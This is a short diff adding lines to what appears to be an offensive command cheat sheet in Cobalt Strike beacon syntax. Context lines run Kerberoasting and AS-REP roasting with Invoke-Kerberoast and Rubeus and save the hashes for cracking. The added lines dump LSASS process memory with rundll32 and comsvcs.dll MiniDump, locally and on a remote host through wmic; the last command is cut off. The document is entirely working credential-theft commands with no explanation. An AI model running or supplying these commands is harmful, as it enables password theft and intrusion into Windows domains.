@@ -22,4 +22,9 @@ psinject 4728 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FileP
 execute-assembly /home/user/work/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
 execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
 ```
+```
+shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 620 C:\ProgramData\lsass.dmp full
+shell rundll32 C:\windows\system32\comsvcs.dll MiniDump 620 dump.bin full
+shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump  [LSASS_PID] 
+```
 
